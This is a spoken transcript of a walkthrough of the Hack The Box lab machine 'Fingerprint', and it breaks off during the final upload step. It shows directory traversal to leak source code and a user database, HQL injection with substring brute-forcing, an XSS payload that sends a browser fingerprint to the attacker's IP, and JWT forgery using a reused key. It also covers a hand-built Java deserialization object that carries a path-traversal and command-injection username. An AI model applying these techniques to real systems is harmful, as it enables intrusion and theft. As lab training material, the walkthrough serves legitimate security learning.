 what's going on youtube this is ipsec i'm doing fingerprint from hack the box which is an insane box and it's insane because it's technically very tough there's not a lot of steps to it but each step is tough and it doesn't really hide itself the first part of the box is an hql injection which is very much similar to sql injection but it's just within hibernate and there's not a lot of information around that if you found like hql map to automate it there's some steps to kind of break it so you have to do that step manually it's tough but once you do that you get access to some java source code and have to craft a deserialization vulnerability by hand because the app doesn't use any common gadgets that you can do with um yso serial once you get code execution on the box there's a set uid binary that you do some boolean logic to dump files and then there's a crypto vulnerability where you can brute force um blocks one byte at a time so with that being said let's just jump in as always we start off with an nmap so dash sc for default scripts sv enumerate versions oh a i'll put all formats bring the nmap directory and call it fingerprint and then the ip address which is what 1010 11.127 this can take some time to run though so i've already ran it looking at the results we have just three ports open the first one being ssh on port 22. its banner tells us it's an ubuntu server then we also have http on port 80. it's banner tells it's it's work zug and running python version 2 which is ancient but thankfully not much really changed from python 3 to 2 so even though we haven't done a python 2 thing in a while we should do just fine here then the final port is http on port 8080 and this is running sun glass fish open source edition 5.0.1 and whenever i read sun i just shudder because it probably means it's oracle and java and all those things that we hate but i want to know when 501 was released so let's just google what sun um glass fish is and it's an open source jakarta ee platform by sun microsystems i'm guessing it's java um i'm gonna google changelog 501 and we can see when this was potentially released uh 5.0 2017 i'm guessing it's 2017-2018 era i don't see anything that specifies 5.0.1 but um chances are that is correct so let's see cve details we probably want to look through those um let's see release five zero we only went there i don't see anything with 501 right but i don't think it's that important um i may do more research if i run into a dead end here to find out exactly when it released and finding cves there but because this one is java i'm going to ignore it and start with the python piece right so let's just go to 10 10 11 127 and we can also while that loads make sure they're not the same thing which we know they're not so they are definitely different pages so this one the title is my log and these links don't go anywhere unlimited for all we got a login panel a copyright date of 2019 so that probably is correct because it is python too um i think these links all went nowhere about us yeah those go nowhere there is a login panel and i want to go to check this real quick we have a copyright of 2018 so we are definitely dealing with some old technology um we can try admin password and it doesn't even mask the password we can try like four one equals one and a comment see if we can log in there um we should be running some type of recon in the background so let's just do ferro buster dash u and i'm gonna do dash b to discover backups and i think that's all i want um so is dash b dash capital b to collect backups and we know this is python so there's no real extension we can do here so we're just gonna let that run and right away i know something really interesting so we have slash admin redirecting us to login but the length is 59 and it's 104 words generally when you just get a 302 redirect or three or one redirect or any redirect in that matter the size of it is very small because it's just the header right so this is i want to say it's an execute after read ear vulnerability um i hate that terminology because air is also an extension for java and a type of application but that's a different tangent so um we should go check this out because this just screams weird right so let's go check out this login i'm going to go to slash admin we're going to send this over to burp suite because this makes it easy to play with and intercept is on so when i go here i'm going to right click intercept the response to this request so we can see what the server sends back to us um i don't know why it just did a get here there we go so this is what we wanted we get oddly enough http 1.0 not 1.1 um hold on a second i gotta see this real quick um so if we go to slash admin uh we do a request on 1.1 so i don't know what is happening here right intercepted response to this so we got a 1.0 we can say 200 okay because by editing this we're now changing it to tell a browser don't redirect because the 302 redirected us to wherever this location header was right we could delete that now because we don't need it and a browser is just going to show us this information so when we do this we have logs and it says auth.log zero bytes and we got actions i try to view auth.log and we just get a blank page but that makes sense because it's zero bytes so the next thing i'm going to do is go to 101011 127 and we're gonna try to log in right and see if we can put anything here we did a login before though um i tried like basic sql injection and we didn't get anything if we refresh this page it zero bytes um the title of this webpage was my log which is a bit weird um let's try see if there's a login function on port 8080 just to see if we can submit anything authenticate now uh username ipsec password please subscribe and we get invalid credentials given if we i guess i have to oh we can view the log again and we have something um oddly enough we have this fingerprint i don't know exactly what this is username ipsec it's not logging the password but we have stuff which is i guess good um we can test for like cross-site scripting since we can see this data i'm just going to put my name in bold and see if it filters it here it does not so we probably have cross-site scripting as well on this login form um the other thing we could test for because we don't know there's like a user hitting this or anything or not um we can do some type of lfi potentially so it's auth.log and if i do a ls on var log um there is off.log here so i'm going to replace that with boot.log to see if i'm in var log right i don't think i am because auth.log normally means like ssh and things like that but um it's still worth checking we get no such log found uh the other thing we could try is like directory traversal here so put a bunch of dot dot slashes and then try etsy passwd and we definitely do have something we have a few users we have john which is the id 1000 my sequel and flask i'm going to guess that this one is the flask application there may be other hints at it but it just being the python and flask is python i'm pretty sure this is definitely flask so i'm going to try proc self cmd line that's generally the very first thing i look at we see python27 is running flask on port 80. so that's definitely interesting the other thing i like getting is environ and we don't have anything which is a bit weird we can't read the environment file we could look at stat and this is the pid this is the parent so we don't even know the parent process id we could try like schedule debug is another good thing to get other processes we could try like java and we see pids1663 1668 1669. we could try to view this information so 1663 cmd line no such log um was it eight and nine could try viewing other processes like this and we don't really get anything so um the next thing i would probably do is use the proc self cwd to get me to the current working directory of this python application and let's do a little fuzz here to see if we can find any source code so for this i'm going to do w fuzz dash u and we want to put um http 101011 127. there we go and then fuzz and there's gonna be a python script so i'm gonna do fuzz dot pi and we can do the word list opt secluse discovery web content i think it's a capital w then rathsmallwords.txt and it's going to take everything in this word list and add doubt pi to it and we're going to hide um four words because four words is no such log found so let's do hw four and see if we get any hits here and i guess while this runs we could take a look at this cross-site scripting thing right we always want to do some type of recon going on in the background so i'm going to try loading an image real quick image source is equal to http 1010 14 8 because that is my ip slash image password and while that runs let's do nc lvmp 80 and hit login we get no uh invalid credentials but i'm waiting to see if someone hits this right because if they do then we know we could probably script out something to steal cookies or something like that and i wish i had sent that to brip sweet so i could make sure i had typed that correctly but let's go check out app auth and util.pie right the other thing we could do we could just hit this log again and see what the image looks like so image source is equal to 1010 i probably have to put a file here right um maybe not because i did hit it so there is that we could try image source is equal to http 10 10 14 8 slash ipsec dot gif slash image i think that's the valid html but we should really take a look at the source codes so i'm just going to use curl to download them so let's go back to burp suite copy and then we can do curl and because it has the dot dot slashes we have to do path as is otherwise curl itself would be um like forget what it's called i think normalization of pads where it would actually um strip off these dot dot slashes so if we do app.pi here we get python source code if i take off this path as is we get not found because what curl did is it just said oh we don't need these and terminate them silly but that's what happens so let's make the src and i'm gonna go in here actually we should call this um like pi source or something because there are two applications and we can run curl dash oh app.pi there was a util and what was the other one off and my net cat i caught myself again i think um because we see oh no connection from 10 10 11 127 uh user agent gozilla so i'm guessing this is a go lane thing it's a headless chrome but gozilla i don't know exactly what this is but we got a referrer of fingerprint.hdb so we know that cross-site scripting does something but let's keep or like focus down on viewing the source code since we're there now so let's see we have app.pi util.pi and off.pi i'm doing this again because i realized i had downloaded auth.pi and named it util.pi so these three files we can vi app.pi and see what happens here so we got flask from dot auth import check so this is probably gonna be the auth.pi importing log path data logs so i'm guessing the auth.log is in data logs auth.log we have a secret key so we can probably forge tokens um oddly enough like this isn't indented i think they should be um so load user session get user id main it's going to render template login yeah this is weird that it's not indented but oh well the spy like this it's probably something to do with my curl or something or maybe the lfi removes spaces at the beginning so login doesn't have anything oh let's see no slash admins where the execute after read was um i wanted to see exactly how that happens right so we have some log thing if ip starts with 127 zeros so i guess only this ip can that's a weird one oh let's see slash admin so the issue they have i'm going to stop fixing the spacing because that's probably going to take a while i just realized how big this file is but right here we're making the response and then we're setting the headers and returning but because we did this whole make response site content it's adding the whole site content into this response and then just says um turn it into a redirect so um you'd probably want this to be like make response nothing or ideally like just set the header 302 you don't want to make the response of site content because that's where the execute after read comes in let's see path admin so when we view so we've got path colon log path so this is how to do that um directory traversal i don't fully actually understand um the director's reversal because normally when you do um something and like pat flask or fast api i would think you wouldn't be able to have dot dot slashes in here but i'm guessing we can because we declared it probably as a path somehow i don't fully understand that but something to play with if you want to learn flask and search other things but there's really nothing interesting in this application like we went over every function i don't see any way to execute code the one thing i am curious about is the database right so where is the database that's probably an auth check so let's look at check.pi so or off.pi is what it was called and it's called users.db so we can download this database probably so let's go back to our curl users.db and we can download it this way users.db so if we do a strings on users.db we have information the better way to do it is sqlite3 users.db we can just dump to dump everything and we see the username admin and you would never guess this password so we could log into the application now so if i go back type admin you will never guess this password we get redirected to slash admin and we're here um all that log is zero bytes again so um i'm going to try logging in this web page we get invalid credentials given so we know there's cross-site scripting here if someone views this page which we know they do but the other thing i'm going to check is like sql injection so let's try the whole admin or one equals one and nothing happens we can try admin or one equals one and a comment and this one is interesting we get a error 500 internal survey error and it's a hibernate issue now i don't know a lot about hibernate um if we went to like google and googled hibernate um java we get the wiki page that says or this is something else object relational persistence query service that like i want to say it's similar to like sql alchemy and python but for java like it takes the database and converts it into an object relational database and you can query things a bit easier in code i guess not 100 positive that's correct but that's how i view it the downside to um hql is it's a very simple language or at least in terms of exploitation there's no like union into out file um xp cmd shell like you can't execute commands it's very boolean so there's not much we can do but there is stuff we can do so let's go and send this query into rip suite so if we do just a single quote here let's go to burp suite make sure i'm intercepting and don't have anything here log in so we don't need to do url encoding because this is a post request so we just do uid is equal to single quote we have the exception right i wonder if i can just keep exception and have it always go here this is just saying maybe i do note so this is query exception like this is an invalid query we can do or one equals one and when i do this i'm going to put this in quotes because um hql also doesn't have a comment so like in my sequel or sql injection we do or one equals one and coming out the rest of everything else so when the server puts a single quote here it doesn't matter because it's commented out um hibernate doesn't have that so you have to be very careful so that's why i'm putting the one in single quotes leaving one here because i know the hql is going to add that for me right so we run this again we look at the note and we see query did not return a unique result 2. so what this is saying is it's expecting uid to be unique it's not and we got two rows so there's two users here so what we have to do here is guess what the username variable is going to be because there's no like information schema table to just guess things like that so the first thing i'm going to do is uid is equal to and we could try admin because admin is generally a user right and we go to note we look at this sql grammar could not extract result set so uid is not it we could try user name and we look at note oh there is no note it just says invalid fingerprint id which is this auth secondary thing um we can validate that i think if we go into the code i have to turn rip suite off let's do control u view source fingerprint so alt secondary is a script get fingerprint id which is declared in this login.js i believe which gets a fingerprint of a browser and it's hard to like forge this because it does do like screen available with available height i guess we may be able to forge it if we download gozilla but if it uses like the ip address or things like that in this whole fingerprint hashing it's going to be difficult so um i'd rather just steal this right so we could easily code a cookie stealer because we have cross-site scripting we know someone hits a web page from that cross-site scripting so let's dabble in that real quick so what we want to do is direct them to us website and then steal the cookie right so that get fingerprint id where is it here is in this so what i'm going to do is let's see let's get out of pi source v exploit i'll call this pwn.xss so we're going to do script source is equal to http i think i have this in a clipboard maybe there we go now from the netcat we know the referral is fingerprint.hdb so i'm going to um replace this with fingerprint.hdb and this will help me like fix any type of browser security issues because the script it's loading from is going to come from the page that it's originally on right i don't think it's going to cause issues i think we could use the same ip anyways but always best practice when you can right so learning this login.js is going to allow us to call the getfingerprint function right so now i can do a document.write and because i'm going to be cautious about special characters i'm going to do this in several document.writes so image source is equal to um [Music] i wonder if i need a quote let's try it without quotes right 10 10 14 8 slash and then we can do document right and this is get finger print id i think i have the casing correctly let me check yep id is capital and then we do a third document.right and let's close out the image source and say slash image so i think that should be good uh what we probably want to do here is stand up a web service or python three http dot server let's just listen on port 80 we probably have to do huh wait oh i'm gonna do dash m there we go and now we can just cat pawn dot xss and paste this into the username field and see if this works so username put something here uh i think it's because we got that loading thing in the right or at the top it's not working there we go invalid credentials and then view auth.log let's get rid of this view source thing so we actually process the html and we didn't get anything so right off the bat we know something's wrong i'm going to press f12 go to console and get fingerprint id is not defined so do we have a typo here or did this script source not work um if we ctrl u we see script source oh it may have not worked because we don't have this host name uh sudo v etsy host let's go 10 10 11 125 and call it fingerprint.hdb and as we're doing that we see something get hit from 10 10 11 127. so i bet if i refresh this now it may decide to work or something may be cached but we see it works so we don't need to put a quote actually here for image source i'm used to it but um it's not needed the reason why i didn't do a single quote is single quote would cause errors within hibernate the other thing we could have done is like a document.write and then did base64 encoding like base64 something and do i think b to a and javascript and write base64 but this way worked as well so we have the fingerprint of 10 10 101011 127. so if we put this here for the off secondary we still get invalid fingerprint id which is weird but remember before we knew there were two users so we could cheat i think we could do open close like this in hibernate and that's gonna say well user is not admin and here we go it says document has moved and we get a jwt now that's not a great way to do it because it works because this only two users in this database is kind of like a ctf gimmick they can use but the other thing we could have done is use substrings so or we can say substring and then the column name which is user one one so this is going to be the first character and only one character is equal to a right and now we get invalid fingerprint id if we do b invalid credentials c d e f and eventually get it right and this would probably mess up better in like intruder or coding a python script but we know um m is the first character and then if we wanted to get multiple characters we could try one two and i think this means the first character the second thing so um first names that begin with m like matt invalid credentials maybe mike we get document moved let's get three characters right we're assuming this is mike so mxk no how about michael or mitchell we have document moved so this is how we could brute force information out of this database right it's a nasty python script to write there is a tool called hql map but it's python 2 and a bit of a pain so i'm not going to cover that um maybe in a separate video i will but for this all we need is username one equals one and we can get this jwt token right so let's write this in a file so jwt dot out just so we have logs of it and then we go to jwt dot io our favorite site for manipulating jwt tokens or just jwts because t stands for token i think so i think it's json web token but looking at it we see um this is a java serialized object in base64 form after dealing with them enough you just recognize them by the site of this rohab means base64 encoded java if it began with like aced that should be a java serialized object that is not base64 encoded those are just like magic things that stick out to anyone that's ever done java deserialization so we can take a look at this if i echo dash and base64-d and then strings uh we actually only want this piece i thought i copied it maybe i did the wrong paste there we go and then strings and we can see kind of what it looks like so the username's michael i think this is the password or maybe michael is the username and one two three four five is the password um we could probably try logging in to see exactly what happened so let's try i guess that the only thing we'll have to do is change your fingerprint and hope that every request we make to this web application doesn't do um a fingerprint check right so if we authenticate now let's try michael did i spell that right eal one two three four five and then put a paste here i had that my clipboard i should have just pasted um paste this okay let's go brip sweet refresh this to log in okay and the secondary we want to put to be this because this is michael's browser fingerprint right so we try to log in and valid credentials that's annoying so maybe that's like is this base64 or maybe not his password echo-n i don't think that's base64 right i just did nothing yeah invalid input um well we can log in with him anyways right so if we just do michael one two three four five and then a blank password um why don't we not intercept that because intercept is off let's just put junk in and then we can go to repeater this field work to log in right so we can just copy this whole thing over paste it in and be super lazy so we get slash welcome and we're logged in so only pictures allowed we can browse for your pick and submit so not sure what to do here we haven't run a door buster on this url right so we probably should do that so just fair buster dash u put this in uh there were no extensions so just let this run and we're getting quite a few hits and fear buster's going to take a long time because it's going to go into all of these directories um one directory that we may want to go in is this backups directory right because we have that but um dash h i don't like doing recurse the first time because it takes a while so i'm going to do dash n and again i'm just seeing what we have uh these redirects we see it's a 301 but only 13 words so i doubt there's really anything there and everything is pretty much the same right this welcome is 183 characters backups is 183 characters login is slightly less but maybe the character difference is in this url right because backups isn't the same length as login so we see three characters and ps slash so that's probably it right we're looking at web infant backups and those go to the same spot so they're the same length so no execute after read here we have j security check which i think is a um java thing but the main thing is this backups directory right so let's go take a look at slash backups to see what is here backups and we get a 404 not found now if this is a backups of java code it's not a large stretch to say it's going to end in dot java because java files are like the file name dot java so let's do a search here just to see if ferro buster finds anything um we probably could have also done it in w fuzz because that's how we did the python thing um only reason i used ferro buster here is because i could just hit the up arrow right and we're looking for it um we could kind of um guess our way so we could try like user.java and we get a file um i'm sure it's going to show up here or maybe not because of casing let's see wrapped medium directories i wonder if we specify a different word list grep user let's do end and begin so there is user in it so i think fair buster will eventually find it but it just takes a while so we have source code here so we should download this source to our computer so i'm going to make dir java source let's go in here and do a curl actually i'm just going to do w get some to type it twice right so we can do user.java look at this file and let's see so this is the application name maybe the class path the package name i i'm not a java guy so um i don't know but there are two potential files like fileutil.java and serutil.java so let's try downloading those so file util nope scr util nope nothing there so we're looking at this username password fingerprint we could try like fingerprint.java we have profile here see we have model user profile storage so let's try that um user profile storage.java that is one so if we look at this we have dot profile.user um we already tried uh sir utils there's a terminal so i'm gonna try grabbing terminal.java um maybe inside a profile there is a off blog but i'm also gonna try settings.java so let's do profile okay and then settings not found see if there's anything else in this file um we did settings doesn't look to be so let's take a look at the last file we downloaded which is profile see if there's anything else we have profile.java.java uh we got user profile storage already get for user so looks like we have all the files um taking a look back at ferro buster oddly enough it did not find it which is weird um i assumed it would have i'm guessing this is user error i'm gonna try gear bust real quick go buster dir extension java i'm going to give it the same exact word list even though i normally don't use wrapped medium dictionaries but we had done i thought that grep on it so we know it exists and the extension is java extension for ferabuster is.java and now we're finding it so um if you're wondering why like i don't change tools that often this is kind of why i'm sure i'm doing something wrong here maybe i need to add uh force recursion because it doesn't want to go outside of this backups directory right but um definitely something is slightly off here so um definitely know your tools so let's go and apologies for the sloppy cut i did want to go over exactly what the issue was because i find it actually pretty cool i'm sure it's going to be fixed soon enough and probably why i missed things in the past with ferro buster that turned me off of it so these are the commands i ran with both um go buster we see this command and it found it the issue is the dot fair buster doesn't want dots an extension and go buster honestly doesn't care because if i do um just java it's going to find this right away actually let's just do vi word list and we can say user does not exist please sub so we have a shorter word list and we can specify dash w to be word list and we see it finds it right if we put a period it'll still find it because go buster smart enough to know the extension just once period something if they put a period fine have them um fear buster if we do this backups i think this was my query exactly if we do java and then word list for i think i called it word list we see it finds nothing right but if i take off the period it's now going to find it so the extensions and fair buster at least right now um don't want a period before it but gearbuster it doesn't matter so hopefully that you found that piece interesting or at least that helps you but now we can go back to the regularly scheduled programming and go over the java source code and i can't stress enough how many mistakes and wrong things i'm about to say like i'm not a java programmer and it's one of those things i've always put off learning it's kind of like a lot of people like reverse engineering and binary exploitation i don't really learn it but these videos force me into it so um this is my understanding of it as of today so i'm just going to look at these files like probably sequentially starting with profile so let's look at it and again i've done this before so this is going to be my recollection we have it loading a bunch of things and then let's see here we have a publix function get for user and if there is no profile on the disk it's going to create one i don't know exactly whoops how it identifies if a user is admin uh we may be able to take a look at that maybe look for like it is admin function and user.java and then down here we have it initializing logs so after the profile is created it's going to do this user profile storage thing and call read profile so um i just want to see like is oh user.java do we have like an is admin so return username equals app i'm guessing um if the username is the string admin it's going to return which means it's going to be true else maybe it will return false yeah so if the username doesn't equal admin it's going to return false if it does then it's going to return true so that's kind of how this works we're getting where the profiles are stored data sessions and i don't know much else about this file so let's just go to user profile storage and see what this is so the main thing we want to focus on is this read profile which looks like that's all there is because the profile thing executes this right so um i guess paths file i think we're reading the profile right here yes so um profile file is going to be the profile location it's going to read it and then it's going to check if the it's an admin profile and if it is an admin profile it's going to run this shell command which is obvious command um injection vulnerability so if we can control either this auth.log variable or this username variable we can get code execution in this and we do have um the jwt remember this object this is going to be what specifies our username so we definitely can inject into here so for this attack it's going to depend on three things number one we have the signing key to this jwt which i believe we do if we go back into i want to say it was repeater where is our lfi so if we look at app.pi here we could have went into our python source directory we can just try this secret key to see if they reuse secret keys paste it in signature verified so the first step to this is done we have a way to manipulate this um java object the other piece we have to do is we have to make our user an admin and we can do that by just writing a serialized profile to the disk potentially because there was an upload piece here um which window was it this welcome we browse for something um let's see i'm just going to make ipsec dot ser for ipsec.serialize it's not going to have data but we're just going to see if we can upload something so htb um what is it this is fingerprint and then we want to put oh i created directory yeah i did um let's do touch there we go and go here submit it did that submit intercept is off if we go here we can look at exactly what it did so here's us uploading and then the response it uploaded to data uploads ipsec.ser so what we want to do here is let's go back to the jwt and look at this so echo dash n base64-d and i'm just going to strings it so this is our jwt and our username is michael1234 and what it's going to do is probably look in uh where was it the read profile um go here is it less profile.vim or let's syntax highlighting is nice get profile location where is it admin profile was it user i could have swore we saw it serializable okay so what it's going to do is make a call see which thing do i have it is so it's going to try to load opt data michael one two three four five right um i'm not sure if it appends anything i don't think it does but it's going to attempt to load this for the user profile um make the oh it appends ser for serialized so we can see it's going to try to load this and that's going to be the username so what if we made something like dot dot slash dot slash go up a few directories we probably only have to go up two directories because we're in up data so this will put us in slash and then we can do a command execution so i'm gonna like ping my host first right and we gotta remember to do dash c for count one so we only send one ping and then we want to go up one directory again because we ran this ping and from here we can do data uploads ipsec.scr so what this is going to do is a profile when it goes to do the whole read thing it's going to um instead of reading from op data it's going to read from data uploads because the read profile strings gonna do something like this right and all this piece doesn't matter and because we're going up to the root directory this piece doesn't matter and we're just saying now the profile is stored in data uploads and it's going to read whatever serialized object we write to and we're going to tell them that ipsec is an admin so because ipsec is an admin it's now going to when it reads this we pass this because ipsec is admin and then when it does get user name this grep we're going to get command execution because our username is going to have that bash thing in it where we do this right so that's in theory what we are going to be doing and if that sounding complex it's probably going to get a bit tougher because we have to write a quick java app because this is all a custom application we can't use yso serial because it's not using like common collections or some known gadgets so we have to craft a serialized object by hand and to do that which is open eclipse and it's been a while since we've done this probably since the fatty video we see 2020-06 that's probably when i installed fatty um oh this is i think a minecraft plug-in dummy plug-in so was that dip slasher so we've done this twice i guess um and probably like twice in my life that i've opened up eclipse and actually made a working project so uh this will go swimmingly right um let's make the directory um fingerprint and then use the directory user profile and i think i want to check that i don't know um my catalog is definitely going to be maven i want to do quick start and can i switch by artifact id i can't um [Music] maybe i want like maven dash i want quick start in this archetype dash quick okay and i'm going to choose this one this orig apache maven archetypes because i don't know exactly what those are so this is the one i want to do and the quick start just creates a sample like hello world application for you um the group id that's going to be pulled from the source code that we have and let's see user.java it's going to be com admin security source and then artifact id um i'm going to call it exploit this is going to be the name of our application and then i think i click finish palm xml already exists here what um [Music] let's see user profile let's go back let's not use the default workspace location and specify our own and then finish there we go that's where i wanted and if i do source main java com admin security source exploit app.java we can see our code right if i click run we get hello world we can change this to be anything we want so just to test it click run again and we have that so what we have to do now is import or other applications right and to do that i'm just going to manually copy it it's probably not the correct way to do it but it's the way i'm going to do it so if we go into main java security source we don't want to go to exploit we just want to stop there and let's go to java source um cap let's see profile do we know where profile is see i'm going to guess it's going to be under model and user profile storage is under profile let's look at user see if this says anything that says model we'll also need to create these two files the file util insert util so let's make the um is it model of models model and i think the other one was profile let's look at user profile storage yep it is profile so you create both of these we have now two directories and we can copy the files out of them there are two of them so cp this will be user.java that goes in model profile.java goes into model and then the other one oh shoot user profile goes into profile there we go so now we have the three source files by find it we can see they all exist so what i want to do is refresh so right click refresh and we have a bunch of syntax errors we can see the file is red so we have to fix these things um let's see this wants declarations so let's go to this one what is this so it's airing right here for follow utils and sir utils so we'll definitely have to create those um we got this lombok and if i googled like lombok pom.xml which is the package manager for i want to say maven um it gives us instructions on adding it so add this to our palm.xml under dependencies add this so that's what i do here so if we go to palm xml dependency let's add that save it we go back to where we were and we see those have been fixed [Music] this java x persistence thing i think we can just completely remove this if we google um java x uh docs let's see what happens with this java x jdk 11. we want to remove all these references because we don't need to use java x so um my computer is hanging slightly so that's not good hopefully the recording is still going and uh did eclipse just crash on me it did that's not polite um i probably ran out of memory on this vm or something let's say exploit let's go here model we are on user right wait user does not exist did delete that file uh let's see less model let's see last model user file exist refresh let's close it here close all these there we go okay no idea well lombok is still fine let's get rid of java persistence and we want to remove anything that it used and to do that we could have been like more thorough and like compare against the documentation however i'm going to remove what our ide tells us we don't have defined so it's going to remove all these things okay so that is fixed now we have this file util and scr util and scrutils is calling to byte array and follow you till it's calling a write so these errors are expected because we don't have these files yet um but we'll get to that soon enough let's expand all these uh sir utils we're not we don't have yet uh terminal we should see what terminal uses terminal is doing this cmd run and this is part of like the web portion code we don't need this piece because we don't want to execute code aren't ourself all we want to do is create the variables and that serialized structure the serialized structure doesn't have the whole command runner piece in we just want to create that user so we can safely delete that and we can delete terminal from up here and this authlog thing we also don't need this is just getting the settings where the authentication log is stored so remove that okay oh we're left with cer utils from so i'm guessing this is going to be like a deserialization function so we did use it we did use a profile we can go here and see what everything is it wants a lot of constructors and this is a piece i don't know really what i'm doing here we're going to hope it works um i'm just going to let it solve things for me by highlighting over and initializing the field this is a boolean i'm just going to say admin profile is always going to be true and then the next thing is we have this where it's creating the new profile we can create the constructor um create constructor there we go and there are things we have to put in this we gotta say like where these two arguments go and the two arguments are going to be logs and admin profile so i can just say this dot logs and i'm going to put it to null and then this dot admin profile and we're going to set it to be whatever admin is set as which is probably going to be true and i'm guessing we have to remove some of the declarations here yeah so remove remove and i don't think we need like this equals true anymore we could probably leave it just like that but i think if we do this it'll default to true which is what we always want right so if we didn't specify something here hopefully it would default to true um i'm not positive again not a java coder so let's create a thing here and this user profile storage we got user 2 so i'm just going to do this dot user is equal to user two and that should be set and again like if we did i don't know if we want final um this is probably correct how it is uh but that's besides the point so that one set if we do this i think it's time to create this sir utils and um i guess file util so what does file util use if we look at file util it's got a write function so this is going to probably write a profile so we just want a thing that writes bytes to java all right writes bytes and java so let me turn rip suite off and i'm just going to google um writing byte file java and see if we get something right so something right here uh this java nio is probably going to be the cleanest so all we have to do is create a function for this and that will go into a utils called fileutil.java and again my eclipse crashed uh something is wonky with this vm that if this doesn't work in the end i'm not going to be surprised in the slightest because of all the times my eclipse has crashed um i've edited a few of those crashes out just because i know it's annoying um but let's see source i probably should close like reset burp and clean up some memory on this vmware assign more memory i'm guessing it's out of memory issues so i wanted to say did i put in my clipboard i do not have my clipboard shoot so we can add this again and if i keep happening maybe i'll just do the rest of this in vim um whenever i'm running eclipse now i don't have memory so it's definitely a memory issue close a bunch of these i want to leave that jwt there we go we have less tabs oh burp suite's closed as well um maybe i need to reboot my vm so i guess i should add more memory to this when i'm doing eclipse things but hopefully closing those tabs fixes it so let's go back in here uh the burp suite being crashed is going to be annoying because i had some good like repeater tabs in that but oh well let's see this user.java it's just utils so maker utils and we refresh we probably could have done it from this gui um let's see new file and we're going to call it what is it fileutil.java okay this is a bit weird i had expected it to like add some boilerplate code for me so i probably did something wrong it also added up here but i bet if i refresh we can see the file down here but like boilerplate code for instance like the first thing there's always this package line that states where it is so we put this in this isn't in profile it's in utils and then we need like public class the name of this file util and then public static void i want to say this one used right so we can define the data and then we also need the file name and this will throw io exception okay and now we can go over here and copy the file right and full disclosure my eclipse had crashed yet again if we look in um here we can see i'm guessing all these are eclipse crashes right so um it's crashed quite a bit when doing this video i just upped the memory of this vm to 12 gigs it was at 8 gigs so hopefully that fixes that issue but we'll have issues later on this video so we have that before we write to the file um we want to make sure the file exists so we can do is file and well this is going to do if the fo if that is if this is not a file then we can create a file from it and after the file is created we can write so file is not right and we just kind of change up the path so we called it file and it's a get absolute path right there and this other piece um we're calling it data okay and now we have to do all the um import statements so because we're in an ide this makes it easy we can just go and import things it's automatically importing that java nio file which is good um this is not importing something file right this is pads.get and we can import paths i believe there we go and then this next one i don't think we want this to be a string what's this error oh we have mismatched parentheses there we go that looks good so now we have the file util uh which thing used it this app and file util this is the data and then this is going to be the location so that looks good um what we have to do now is create sir utils so let's do new um i'm just going to can i copy this copy paste and i'm going to call it sir utils okay refresh we could have clicked on it up there the main reason i did that is so i didn't have to redo this piece so this one public class um sir utils and we're going to have different functions here um [Music] what use sir utils i'm just going to go back here and you can see all my t-mux panes are gone because um well we rebooted so we have a two-byte array and this is just profile so this is just a serialized function and it probably doesn't use common utils because if it did there's a gadget in common utils with why so serial code execution so they're just doing this manually i guess that would be my guess at y i'm guessing from is dcr lies so we need two functions two byte array so i'm just going to copy these out so copy and then we can copy this one okay and now we're off to copy and paste more code so i'm just going to go to google and say convert object to byte array java and we can go to stack overflow and see what they have so you're scrolling down it looks like this one is good convert to and current from so we can copy this and paste these functions so first off we probably want this to be a public not private and the name this is going to be to bite array and we can um i don't know if we want object here do we maybe we do i think we just want serializable maybe the same thing okay and then this next piece try output stream uh this is probably more imports i'm going to remove our previous imports and we can add these so add that io exception byte array stream add this okay and then one of the comments on this um talking about the data is not flushed so we can also just flush this as well so um we can just call alt dot flush and i think that's good so the next piece we probably have is the same thing so public object and this is just called from and i think that's good um again import that import i think that's fine okay so hopefully that all works so so you tools from cannot make static reference uh let's see i think we call these static there we go and we no longer have any errors on any of our files which is amazing so the next thing we have to do is just create the objects so we start off with creating a profile so our profile structure and we create it the first piece was the log or something i don't think this piece matters and then the next piece is is admin right and we have to import this there we go import that and i want to say this is just airing because it's not being used maybe so the next piece of code we want to write this to a file so we can do file util and then we want to import this um let's see we just do file util dot right there we go it automatically imported that i don't know what i did to cause that but we want to now write the serialized object so show utils to byte array and then the object we want to serialize is going to be profile and then we write it to um a location so this is going to be ipsec.ser save this and we probably have to import file okay and this command is wrong oh um ioexception if we add throw there we go awesome so if i run this we don't get anything but hopefully we have an ipsec.ser somewhere that's probably going to be in user profile exploit and here it is so let me delete this real quick run it again to prove it just got created right and if we xxd it it's probably going to start with aced because that's the non-base64 thing and if i strings this file let's see we just have this and i'm hoping um this l right here this admin profile um this l is meaning true let's see i don't know enough about this to go through it but all we need is admin profile to be set to true for this file there's nothing else that's important for this because again all we're triggering is um let's see java source v user profile storage.java all we're triggering is when it reads this profile for this profile dot is admin profile to be true so uh we don't need the username or anything in this file so i think we are good there the next piece we're going to have to do is now right the um next um thing that has the command injection um before we do that remember the jwt dot io that oh do i still have it here uh we'll have to re-get that token oddly enough it remembered my secret key but erased the token in the reboot weird but if i do base64 it begins with that road that you know the aced is base64 which is a serialized object so let's create a user so this again is going to go in the jwt token that instructs everything where it begins uh the user id we can just give that anything we want i'm going to do 9001 and um i forget exactly the number of dot dot slashes i used before when i was explaining this but let's just try this ping c1 for count 10 10 14 8 okay and then we gotta go up another directory because this put us in a directory i want to say that's correct and then we upload to data uploads and i can call this ipsec.ser i believe okay and then the next two parameters of user don't matter i don't think we can import this okay and what's this complaining about oh we have to create a constructor oh that's lovely create this okay so we can say this dot and it's going to be id username password fingerprint so id is equal to i this dot username is equal to string this dot password is equal to string2 this dot fingerprint is equal to string three now again this is bad code we probably should have renamed the variables but um it's an exploit script it's a quick hack job to get working so as long as it works the first time or maybe the second time we won't go into too many issues so now we have to do the user profile storage um and we can declare this there we go user profile storage user because we want to serialize this so system dot out dot print line and base 64.get encoder and it automatically imported that for me awesome dot encode to string and what we want it in code is not rx0 it's going to be sir utils dot to byte array and it's going to be ups which is our user profile storage and i need to do system see i probably have a mismatched parenthesis do i do three there we go and that looks better so if we run this we have a base64 string now so i can copy this echo dash n paste base64-d [Music] let's try it again and we can see let's just do a strings real quick what a cookie looks like and where our username is we have this so hopefully we get code execution this way and hope that our cookie is still saved for this box so if we do 1010 127 8080 slash welcome hey we are so we don't have to redo anything i think um we got everything we can continue with so what i'm going to do is upload ipsec.ser and let's go through burp suite so you can see exactly what happens here i was worried that when i did this um the cookie wouldn't be saved and i have to go do that like cross-site scripting step again to get the fingerprint and the hibernate injection so we can see this request we're uploading ipsec.scr which is our cli string and hoping that this admin profile is set to true um i don't know exactly how to verify that i guess we could go back in java read the file unserialize it and check but that sounds like a lot of work for something we can just test right so it's been uploaded to data uploads 